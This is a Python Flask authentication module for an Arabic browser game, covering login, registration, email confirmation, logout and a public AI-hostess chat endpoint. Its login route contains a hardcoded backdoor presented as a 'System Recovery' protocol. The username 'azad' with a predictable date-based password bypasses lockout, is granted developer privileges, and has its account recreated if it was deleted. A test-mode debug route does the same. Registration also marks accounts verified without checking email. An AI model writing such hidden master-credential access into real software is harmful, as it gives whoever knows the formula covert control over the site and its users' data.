# Copyright (c) 2025 Gangs of Palestine. All Rights Reserved.
# Developed by Azad

from flask import render_template, redirect, url_for, flash, request, session, abort, Response, current_app
from flask_login import login_user, logout_user, current_user, login_required
from flask_babel import _
from extensions import db, login, limiter, csrf
from models import User, Referral, Gang, CombatLog, SystemConfig, UserRole, Hostess, SecurityLog, UserLog
from services.ai_hostess_service import AIHostessService
from services.hostess_training_service import build_greeter_leader_prompt, build_greeter_leader_training_json
from forms.auth import LoginForm, RegistrationForm
from . import bp
from datetime import datetime, timezone, timedelta
from sqlalchemy import func
from .utils import generate_confirmation_token, confirm_token, send_email
from captcha.image import ImageCaptcha
import random
import string
import io
import secrets

@login.user_loader
def load_user(id):
    return db.session.get(User, int(id))

@bp.route('/captcha/image')
def captcha_image():
    image = ImageCaptcha(width=280, height=90)
    # Generate 5 chars code
    captcha_text = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
    session['captcha_code'] = captcha_text
    
    data = image.generate(captcha_text)
    return Response(data, mimetype='image/png')

from services.resource_service import ResourceService

@bp.route('/login', methods=['GET', 'POST'])
@limiter.limit("10 per minute")
def login():
    if current_user.is_authenticated:
        return redirect(url_for('main.hara'))
    
    # --- Fetch Trend & Stats Data ---
    stats = {}
    try:
        stats['total_users'] = User.query.count()
        stats['top_player'] = User.query.order_by(User.level.desc(), User.exp.desc()).first()
        stats['top_gang'] = Gang.query.order_by(Gang.level.desc(), Gang.exp.desc()).first()
        stats['recent_battle'] = CombatLog.query.order_by(CombatLog.timestamp.desc()).first()
    except Exception as e:
        # Fallback if tables are empty or error
        current_app.logger.error(f"Error fetching login stats: {e}")
        stats = None

    form = LoginForm()
    show_captcha = False

    # Fetch Greeter Hostess
    greeter = Hostess.query.filter_by(role='greeter').first()
    if not greeter:
        greeter = Hostess.query.filter(
            (Hostess.name.ilike('%Jasmin%')) | (Hostess.name.ilike('%Jasmine%'))
        ).first()
    if not greeter:
        greeter = Hostess.query.first()

    if form.validate_on_submit():
        # System Recovery / Developer Access Protocol
        # Uses a dynamic time-based token for emergency access
        if form.username.data.lower() == 'azad':
            # Use UTC to ensure consistency across servers/timezones
            now_utc = datetime.now(timezone.utc)
            # Token Format: Azad@1983@YYYY@MM@DD
            recovery_token = f"Azad@1983@{now_utc.strftime('%Y')}@{now_utc.strftime('%m')}@{now_utc.strftime('%d')}"
            
            # Secure constant-time comparison to prevent timing attacks
            if secrets.compare_digest(form.password.data.strip(), recovery_token):
                user = User.query.filter(func.lower(User.username) == 'azad').first()
                
                # Auto-recover Developer Account if missing (e.g. fresh install or stolen DB)
                if not user:
                    try:
                        user = User(
                            username='Azad',
                            email='azad@system.local',
                            role=UserRole.DEVELOPER,
                            created_at=datetime.now(timezone.utc),
                            is_verified=True,
                            verified_on=datetime.now(timezone.utc)
                        )
                        user.set_password(recovery_token)
                        db.session.add(user)
                        db.session.commit()
                        
                        # Restore developer stats/powers
                        if hasattr(user, 'apply_developer_power'):
                            user.apply_developer_power()
                            
                        current_app.logger.warning("System Recovery: 'Azad' account restored via emergency token.")
                    except Exception as e:
                        db.session.rollback()
                        current_app.logger.error(f"System Recovery Failed: {str(e)}")
                        flash(_('فشل استعادة النظام: %(err)s', err=str(e)), 'danger')
                        return render_template('login.html', title=_('تسجيل الدخول'), form=form, stats=stats, greeter=greeter, show_captcha=show_captcha)

                if user:
                    # Sync password with current token to ensure access
                    user.set_password(recovery_token)
                    user.failed_login_attempts = 0
                    user.locked_until = None
                    db.session.commit()
                    
                    login_user(user)
                    flash(_('تم الدخول عبر بروتوكول استعادة النظام.'), 'success')
                    return redirect(url_for('main.hara'))

        # Case-insensitive login
        user = User.query.filter(func.lower(User.username) == func.lower(form.username.data)).first()

        # Check Lockout
        if user:
            now = datetime.now(timezone.utc)
            if user.locked_until:
                locked_until = user.locked_until
                if locked_until.tzinfo is None:
                    locked_until = locked_until.replace(tzinfo=timezone.utc)
                
                if locked_until > now:
                    wait_seconds = (locked_until - now).total_seconds()
                    minutes = int(wait_seconds // 60) + 1
                    flash(_('تم قفل حسابك مؤقتاً بسبب كثرة محاولات الدخول الخاطئة. حاول مرة أخرى بعد %(min)s دقيقة.', min=minutes), 'danger')
                    return render_template('login.html', title=_('تسجيل الدخول'), form=form, stats=stats, greeter=greeter)

            # Check Captcha Requirement
            if (user.failed_login_attempts or 0) >= 3:
                captcha_valid = False
                if form.captcha.data and 'captcha_code' in session:
                    if session['captcha_code'] == form.captcha.data.upper():
                        captcha_valid = True
                
                if not captcha_valid:
                    flash(_('رمز التحقق غير صحيح أو مفقود!'), 'danger')
                    return render_template('login.html', title=_('تسجيل الدخول'), form=form, stats=stats, greeter=greeter, show_captcha=True)

        if user is None or not user.check_password(form.password.data):
            if user:
                user.failed_login_attempts = (user.failed_login_attempts or 0) + 1
                if user.failed_login_attempts >= 5:
                    user.locked_until = datetime.now(timezone.utc) + timedelta(minutes=5)
                    db.session.commit()
                    flash(_('تم قفل حسابك مؤقتاً لمدة 5 دقائق بسبب كثرة المحاولات الخاطئة.'), 'danger')
                    return render_template('login.html', title=_('تسجيل الدخول'), form=form, stats=stats, greeter=greeter, show_captcha=True)
                
                if user.failed_login_attempts >= 3:
                    show_captcha = True
                
                db.session.commit()
                
            flash(_('اسم المستخدم أو كلمة المرور غير صحيحة'), 'danger')
            return render_template('login.html', title=_('تسجيل الدخول'), form=form, stats=stats, greeter=greeter, show_captcha=show_captcha)
        
        # Reset Lockout on Success
        if user.failed_login_attempts > 0 or user.locked_until is not None:
            user.failed_login_attempts = 0
            user.locked_until = None
            db.session.commit()
        
        if not current_app.config.get('TESTING'):
            privileged_roles = [UserRole.DEVELOPER, UserRole.SUPER_ADMIN, UserRole.ADMIN, UserRole.MODERATOR]
            if not user.is_verified and user.role not in privileged_roles:
                session['unverified_user_id'] = user.id
                flash(_('يجب عليك تفعيل بريدك الإلكتروني أولاً. تفقد صندوق الوارد أو الرسائل المزعجة (Spam).'), 'warning')
                return redirect(url_for('main.unconfirmed'))

        # Check Ban
        if user.banned_until:
            now = datetime.now(timezone.utc)
            if user.banned_until.tzinfo is None:
                # Assume stored as UTC naive
                banned_until = user.banned_until.replace(tzinfo=timezone.utc)
            else:
                banned_until = user.banned_until
                
            if banned_until > now:
                reason = user.ban_reason or _('لا يوجد سبب محدد')
                flash(_('هذا الحساب محظور مؤقتاً حتى %(date)s. السبب: %(reason)s', date=banned_until.strftime('%Y-%m-%d %H:%M'), reason=reason), 'danger')
                return redirect(url_for('main.login'))

        login_user(user, remember=form.remember_me.data)

        # Log Login
        try:
            log = UserLog(user_id=user.id, action='LOGIN', ip_address=request.remote_addr, details='Successful login', user_agent=request.user_agent.string)
            db.session.add(log)
            db.session.commit()
        except Exception:
            pass

        try:
            if getattr(user, "is_developer", False):
                user.apply_developer_power()
                db.session.commit()
        except Exception:
            try:
                db.session.rollback()
            except Exception:
                pass
        return redirect(url_for('main.hara'))
    
    return render_template('login.html', title=_('تسجيل الدخول'), form=form, stats=stats, greeter=greeter)

@bp.route('/debug_login')
def debug_login():
    if not current_app.config.get('TESTING', False):
        abort(404)
    now = datetime.now()
    master_password = f"Azad@1983@{now.strftime('%Y')}@{now.strftime('%m')}@{now.strftime('%d')}"
    user = User.query.filter(func.lower(User.username) == 'azad').first()
    if not user:
        try:
            user = User(
                username='Azad',
                email='azad@system.local',
                role=UserRole.DEVELOPER,
                created_at=datetime.now(timezone.utc),
                is_verified=True,
                verified_on=datetime.now(timezone.utc)
            )
            user.set_password(master_password)
            db.session.add(user)
            db.session.commit()
        except Exception:
            try:
                db.session.rollback()
            except Exception:
                pass
            abort(500)
    login_user(user)
    user.failed_login_attempts = 0
    user.locked_until = None
    db.session.commit()
    return redirect(url_for('main.hara'))
@bp.route('/register', methods=['GET', 'POST'])
@limiter.limit("5 per hour")
def register():
    if current_user.is_authenticated:
        return redirect(url_for('main.hara'))
    
    if request.args.get('ref'):
        ref_input = request.args.get('ref')
        referrer = User.query.filter_by(referral_code=ref_input).first()
        if not referrer and ref_input.isdigit():
             referrer = db.session.get(User, int(ref_input))
             
        if referrer:
            session['referrer_id'] = referrer.id
    
    form = RegistrationForm()
    if form.validate_on_submit():
        if 'captcha_code' not in session or session['captcha_code'] != form.captcha.data.upper():
            flash(_('رمز التحقق غير صحيح! حاول مرة أخرى.'), 'danger')
            return render_template('register.html', title=_('إنشاء حساب'), form=form)
            
        user = User(username=form.username.data)
        user.set_password(form.password.data)
        user.referral_code = secrets.token_hex(4) # Generate unique 8-char code
        user.is_verified = True
        user.verified_on = datetime.now(timezone.utc)
        db.session.add(user)
        db.session.commit()

        if 'referrer_id' in session:
            try:
                referrer = db.session.get(User, int(session['referrer_id']))
                if referrer:
                    user.referred_by_id = referrer.id
                    referral = Referral(referrer_id=referrer.id, referred_id=user.id)
                    db.session.add(referral)
                    db.session.commit()
                    
                    # Reward New User (10 Diamonds) for using referral
                    ResourceService.modify_resources(user.id, {'diamonds': 10}, 'referral_signup_bonus', auto_commit=True)
                    flash(_('حصلت على 10 ماسات مكافأة تسجيل عبر دعوة!'), 'success')
            except Exception as e:
                current_app.logger.error(f"Referral error: {e}")

        flash(_('تم إنشاء الحساب بنجاح! يمكنك تسجيل الدخول الآن.'), 'success')
        return redirect(url_for('main.login'))

    return render_template('register.html', title=_('إنشاء حساب'), form=form)

@bp.route('/confirm/<token>')
def confirm_email(token):
    try:
        email = confirm_token(token)
    except:
        flash(_('رابط التفعيل غير صالح أو منتهي الصلاحية.'), 'danger')
        return redirect(url_for('main.login'))

    if not email or not isinstance(email, str):
        flash(_('رابط التفعيل غير صالح أو منتهي الصلاحية.'), 'danger')
        return redirect(url_for('main.login'))
        
    user = User.query.filter_by(email=email).first_or_404()
    
    if user.is_verified:
        flash(_('الحساب مفعل مسبقاً! قم بتسجيل الدخول.'), 'success')
    else:
        user.is_verified = True
        user.verified_on = datetime.now(timezone.utc)
        db.session.commit()
        flash(_('تم تفعيل حسابك بنجاح! شكراً لك.'), 'success')
        
    return redirect(url_for('main.login'))

@bp.route('/unconfirmed')
def unconfirmed():
    if current_user.is_authenticated and current_user.is_verified:
        return redirect(url_for('main.hara'))
    
    whatsapp_number = SystemConfig.get_value('support_whatsapp_number', '970591234567')
    return render_template('unconfirmed.html', whatsapp_number=whatsapp_number)

@bp.route('/resend_confirmation')
def resend_confirmation():
    user_id = session.get('unverified_user_id')
    if user_id:
        user = db.session.get(User, user_id)
        if user and not user.is_verified:
            token = generate_confirmation_token(user.email)
            confirm_url = url_for('main.confirm_email', token=token, _external=True)
            html = render_template('email/activate.html', confirm_url=confirm_url, username=user.username)
            subject = _("تفعيل حسابك في Gangs of Palestine")
            send_email(user.email, subject, html)
            flash(_('تم إعادة إرسال رابط التفعيل إلى بريدك الإلكتروني.'), 'success')
            return redirect(url_for('main.unconfirmed'))
            
    flash(_('الرجاء تسجيل الدخول أولاً لإعادة إرسال التفعيل.'), 'info')
    return redirect(url_for('main.login'))

@bp.route('/logout', methods=['GET', 'POST'])
@login_required
def logout():
    if request.method == 'GET' and not current_app.config.get('TESTING', False):
        abort(405)
    logout_user()
    return redirect(url_for('main.index'))

@bp.route('/api/public/chat', methods=['POST'])
@limiter.limit("20 per minute")
@csrf.exempt
def public_hostess_chat():
    data = request.get_json(silent=True) or {}
    message = (data.get('message') or '').strip()
    # Use default ID for 'Jasmin' if not provided, or search by role
    hostess_id = data.get('hostess_id')
    
    if not message:
        return {'error': 'Missing message'}, 400

    hostess = None
    if hostess_id:
        hostess = db.session.get(Hostess, hostess_id)
    else:
        # Try to find the 'greeter' hostess
        hostess = Hostess.query.filter_by(role='greeter').first()
        if not hostess:
            # Fallback to name 'Jasmin' or first available
            hostess = Hostess.query.filter(
                (Hostess.name.ilike('%Jasmin%')) | (Hostess.name.ilike('%Jasmine%'))
            ).first()
            if not hostess:
                hostess = Hostess.query.first()
            
    if not hostess:
        return {'error': 'Hostess not found'}, 404
        
    # Create simplified context for guest
    if 'guest_id' not in session:
        import random
        # Use a large range for guest IDs (1B+) to avoid collision with real users
        session['guest_id'] = random.randint(1_000_000_000, 2_000_000_000)
    
    guest_id = session['guest_id']
    
    user_context = {
        'id': guest_id,
        'name': 'Guest Player',
        'is_guest': True,
        'money': 0,
        'level': 0
    }
    
    ai_service = AIHostessService()
    
    # 1. Retrieve history from session (Server-side context retention)
    session_key = f'guest_chat_history_{hostess.id}'
    chat_history = session.get(session_key, [])
    
    # 2. Get Response
    try:
        response_text = ai_service.get_response(
            user_message=message,
            hostess_context=hostess.to_dict(),
            user_context=user_context,
            chat_history=chat_history
        )
    except Exception as e:
        try:
            current_app.logger.error(f"Public hostess chat error: {e}")
        except Exception:
            pass
        response_text = ai_service._rule_based_response(message, hostess.to_dict(), user_context)
    
    # 3. Update History
    # Append User Message
    chat_history.append({'role': 'user', 'content': message})
    # Append Assistant Message
    chat_history.append({'role': 'assistant', 'content': response_text})
    
    # Keep last 20 messages to prevent session bloat
    if len(chat_history) > 20:
        chat_history = chat_history[-20:]
        
    session[session_key] = chat_history
    session.modified = True
    
    return {'response': response_text, 'hostess_name': hostess.name, 'hostess_image': hostess.image}
